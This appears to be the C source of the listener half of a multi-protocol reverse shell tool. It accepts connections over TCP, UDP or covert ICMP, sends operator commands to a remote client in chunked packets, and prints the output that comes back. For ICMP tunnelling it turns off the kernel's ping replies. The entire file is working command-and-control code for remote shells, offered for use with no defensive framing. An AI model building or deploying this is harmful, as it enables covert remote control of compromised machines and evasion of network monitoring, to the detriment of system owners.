#include "mplistener.h"

pthread_t input_thread_id;
pthread_mutex_t lock;
pthread_cond_t cv;

atomic_bool COMMAND_PAYLOAD_READY   = false;
atomic_bool RUN                     = true;

mp_session_buffer *session_buffer   = NULL;
mp_command_buffer *command_buffer   = NULL;
mp_result_buffer *result_buffer     = NULL;

unsigned char *packet_in            = NULL;
unsigned char *packet_out           = NULL;

char *command_file_path             = NULL;
char *result_file_path              = NULL;

FILE *command_input_file            = NULL;
FILE *result_output_file            = NULL;

int port                            = -1;
int protocol                        = PROTOCOL_TCP;
uint32_t max_payload_size           = DEFAULT_MAX_PAYLOAD_SIZE;
char client_ip[32]                  = "UNKNOWN";

static void show_usage(void)
{
    const char *usage =
        "\nUSAGE: ./MPListener --protocol=tcp|udp|icmp [OPTIONS]\n\n" \
        "Options:\n" \
        "-------\n" \
        "--port=8080\n" \
        "--command-file=/path/to/file\n" \
        "--result-file=/path/to/file\n\n";

    printf("%s", usage);
    exit(EXIT_FAILURE);
}

static void init_buffers(void)
{
    session_buffer                      = (mp_session_buffer *) calloc(1, sizeof(mp_session_buffer));

    command_buffer                      = (mp_command_buffer *) calloc(1, sizeof(mp_command_buffer));
    command_buffer->data                = (unsigned char *) malloc(MAX_COMMAND_SIZE);
    command_buffer->num_bytes_allocated = MAX_COMMAND_SIZE;

    result_buffer                        = (mp_result_buffer *) calloc(1, sizeof(mp_result_buffer));
    result_buffer->data                  = (unsigned char *) malloc(INITIAL_MALLOC_SIZE);
    result_buffer->num_bytes_allocated   = INITIAL_MALLOC_SIZE;

    packet_in = (unsigned char *) calloc(1, MAX_PACKET_SIZE);
    packet_out = (unsigned char *) calloc(1, MAX_PACKET_SIZE);
}

static void cleanup(void)
{
    if (command_input_file != NULL)
        fclose(command_input_file);
    if (result_output_file != NULL)
        fclose(result_output_file);

    if (command_buffer != NULL && command_buffer->data != NULL)
        free(command_buffer->data);
    if (result_buffer != NULL && result_buffer->data != NULL)
        free(result_buffer->data);

    free(command_buffer);
    free(result_buffer);
    free(session_buffer);
    free(packet_in);
    free(packet_out);
}

static void signal_handler(int signum)
{
    RUN = false;
    cleanup();
    exit(EXIT_SUCCESS);
}

int main(int argc, const char *argv[])
{
    char delimiter[] = "=";
    for (int i = 1; i < argc; i++)
    {
        char *param_name  = NULL;
        char *param_value = NULL;

        char *current_argument = (char *) argv[i];
        param_name = strtok(current_argument, delimiter);

        if (param_name != NULL)
            param_value = strtok(NULL, delimiter);

        if (param_name != NULL && param_value != NULL)
        {
            if (strcmp(param_name, "--port") == 0)               { port = atoi(param_value); }
            else if (strcmp(param_name, "--protocol") == 0)
            {
                if (strcmp(param_value, "tcp") == 0)             { protocol = PROTOCOL_TCP; }
                else if (strcmp(param_value, "udp") == 0)        { protocol = PROTOCOL_UDP; }
                else if (strcmp(param_value, "icmp") == 0)       { protocol = PROTOCOL_ICMP; }
                else { show_usage(); }
            }
            else if (strcmp(param_name, "--command-file") == 0)  { command_file_path = param_value; }
            else if (strcmp(param_name, "--result-file") == 0)   { result_file_path  = param_value; }
            else { show_usage(); }
        }
        else { show_usage(); }
    }

    if ((protocol != PROTOCOL_ICMP) && (port <= 0 || port > 65535))
    {
        show_usage();
    }

    printf("************************************************************\n");
    printf("*%-58s*\n", "");
    printf("*%-14s%s%-14s*\n","", "REVERSE SHELL LISTENER STARTED", "");
    printf("*%-58s*\n", "");
    printf("************************************************************\n");
    printf("\n");

    if (protocol != PROTOCOL_ICMP)
        printf("[+] LISTENING ON PORT: %d\n", port);

    if (protocol == PROTOCOL_TCP)
        printf("[+] TRANSFER PROTOCOL: TCP\n");
    else if (protocol == PROTOCOL_UDP)
        printf("[+] TRANSFER PROTOCOL: UDP\n");
    else
    {
        printf("[+] TRANSFER PROTOCOL: ICMP\n");
        printf("[+] Disabling automatic kernel ping replies ...\n");
        int status = system("echo '1' > /proc/sys/net/ipv4/icmp_echo_ignore_all");
        if (status != 0)
        {
            printf("[-] Could not disable automatic kernel ping replies. Exiting...\n");
            exit(EXIT_FAILURE);
        }
    }
    if (command_file_path != NULL)
    {
        printf("[+] Opening command input file ...\n");
        command_input_file = fopen(command_file_path, "r");
        if (command_input_file == NULL)
            printf("[-] Could not open file! Fallback to stdin ...\n");
    }
    if (result_file_path != NULL)
    {
        printf("[+] Opening result output file ...\n");
        result_output_file = fopen(result_file_path, "w");
        if (result_output_file == NULL)
            printf("[-] Could not open file! Fallback to stdout ...\n");
    }

    printf("[+] Installing SIGINT handler ...\n");
    signal(SIGINT, signal_handler);

    int status = EXIT_SUCCESS;
    switch (protocol)
    {
        case PROTOCOL_TCP:
            status = start_tcp_listener(port);
            break;
        case PROTOCOL_UDP:
            init_buffers();
            status = start_udp_listener(port);
            break;
        case PROTOCOL_ICMP:
            init_buffers();
            status = start_icmp_listener();
    }

    cleanup();
    return status;
}

static void read_command(void)
{
    COMMAND_PAYLOAD_READY = false;
    while (RUN)
    {
        printf("[%s] >> ", client_ip);

        char command[MAX_COMMAND_SIZE] = {0};
        if (command_input_file != NULL)
        {
            // On EOF/Error redirect input to stdin
            if ((fgets(command, sizeof(command), command_input_file)) == NULL)
            {
                fclose(command_input_file);
                command_input_file = NULL;
                printf("\n");
                continue;
            }
        }
        else { fgets(command, sizeof(command), stdin); }

        // Only newline is present
        if (strlen(command) <= 1)
        {
            printf("\n");
            continue;
        }

        // Replace newline with null character
        command[strlen(command)-1] = '\0';

        // If command is $close-output close output file which redirects output to stdout
        if (strcmp(command, "$close-output") == 0)
        {
            fclose(result_output_file);
            result_output_file = NULL;
            continue;
        }

        // If command input from file is specified echo the command on the command line
        if (command_input_file != NULL) { puts(command); }

        // If result output to file is specified echo the command back to file
        if (result_output_file != NULL) { fprintf(result_output_file, "COMMAND => %s\n", command); }

        memcpy(command_buffer->data, &command[0], strlen(command)+1);
        command_buffer->num_bytes_occupied = strlen(command)+1;
        printf("Waiting for response...\n");

        break;
    }
    COMMAND_PAYLOAD_READY = true;
}

static void *input_handler(void *data)
{
    read_command();
    while (RUN)
    {
        pthread_mutex_lock(&lock);
        pthread_cond_wait(&cv, &lock);
        read_command();
        pthread_mutex_unlock(&lock);

        if ((strcmp((char*)command_buffer->data, "quit") == 0) || (strcmp((char *)command_buffer->data, "exit") == 0))
            break;
    }
}

bool process_packet(
    struct sockaddr_in client_address,
    ssize_t num_bytes_received,
    mp_payload_header *header_in,
    mp_payload_header *header_out,
    unsigned char *data_in,
    unsigned char *data_out
)
{
    bool should_send_response = true;

    if (num_bytes_received < sizeof(mp_payload_header))
        return should_send_response;

    uint32_t session_id   = ntohl(header_in->session_id);
    uint32_t packet_id    = ntohl(header_in->packet_id);
    uint16_t payload_size = ntohs(header_in->payload_size);

    // First-packet == session initialization
    if (packet_id == 1 && session_buffer->session_id == 0)
    {
        // Initiate session buffer
        session_buffer->session_id           = session_id;
        session_buffer->last_packet_received = packet_id;

        // Initiate output headers
        header_out->session_id   = htonl(session_id);
        header_out->packet_id    = htonl(packet_id);
        header_out->payload_size = 0;

        // The first packet contains only 4 bytes
        // that specify the desired max payload size
        if (payload_size == 4)
        {
            uint32_t *temp = (uint32_t*) &data_in[0];
            uint32_t temp_value = ntohl(*temp);
            if (temp_value > 0 && temp_value < DEFAULT_MAX_PAYLOAD_SIZE)
                max_payload_size = temp_value;
        }

        struct sockaddr_in *address = (struct sockaddr_in *)&client_address;
        char *ip = inet_ntoa(address->sin_addr);
        if (ip != NULL)
            memcpy(client_ip, ip, strlen(ip));
        printf("[+] Received connection from %s\n\n", client_ip);

        if ((pthread_create(&input_thread_id, NULL, &input_handler, NULL)) != 0)
        {
            printf("[-] Could not create input thread! Exiting ...");
            RUN = false;
        }
        else { pthread_cond_signal(&cv); }
    }

    // Subsequent packets
    else if (session_buffer->session_id == session_id)
    {
        if (packet_id == (session_buffer->last_packet_received + 1))
        {
            session_buffer->last_packet_received = packet_id;
            if (payload_size > 0)
            {
                if (payload_size >= (result_buffer->num_bytes_allocated - result_buffer->num_bytes_occupied))
                {
                    size_t new_allocated_size = (2 * result_buffer->num_bytes_allocated);
                    result_buffer->data = (unsigned char *)realloc(result_buffer->data, new_allocated_size);
                    result_buffer->num_bytes_allocated = new_allocated_size;
                }

                memcpy(&result_buffer->data[result_buffer->num_bytes_occupied], data_in, payload_size);
                result_buffer->num_bytes_occupied += payload_size;
            }
            else
            {
                // If there is anything in the result buffer
                // on first new empty packet output it to screen,
                // clear buffer, and wake up command input thread.
                if (result_buffer->num_bytes_occupied > 0)
                {
                    if (result_output_file != NULL)
                        fprintf(result_output_file, "%.*s", result_buffer->num_bytes_occupied, result_buffer->data);
                    else
                        printf("%.*s", result_buffer->num_bytes_occupied, result_buffer->data);

                    memset(result_buffer->data, 0, result_buffer->num_bytes_occupied);
                    result_buffer->num_bytes_occupied = 0;

                    pthread_cond_signal(&cv);
                }
            }

            // Set new payload if present or clear the old one if not.
            // COMMAND_PAYLOAD_READY will be true after the command
            // has been entered at the command prompt and saved into
            // command_buffer.
            header_out->payload_size = 0;
            if (COMMAND_PAYLOAD_READY)
            {
                if (command_buffer->num_bytes_occupied > 0)
                {
                    // If command is quit/exit break the loop after sending the packet
                    if ((strcmp((char *)command_buffer->data, "quit") == 0) || (strcmp((char *)command_buffer->data, "exit") == 0))
                        RUN = false;

                    if (command_buffer->num_bytes_occupied > max_payload_size)
                    {
                        header_out->payload_size = htons(max_payload_size);
                        memcpy(data_out,&command_buffer->data[command_buffer->current_read_position],max_payload_size);
                        command_buffer->current_read_position += max_payload_size;
                        command_buffer->num_bytes_occupied    -= max_payload_size;
                    }
                    else
                    {
                        header_out->payload_size = htons(command_buffer->num_bytes_occupied);
                        memcpy(data_out, &command_buffer->data[command_buffer->current_read_position], command_buffer->num_bytes_occupied);
                        command_buffer->current_read_position = 0;
                        command_buffer->num_bytes_occupied    = 0;
                    }
                }
            }
        }
    }
    else { should_send_response = false; }

    if (should_send_response)
        header_out->packet_id = htonl(session_buffer->last_packet_received);

    return should_send_response;
}
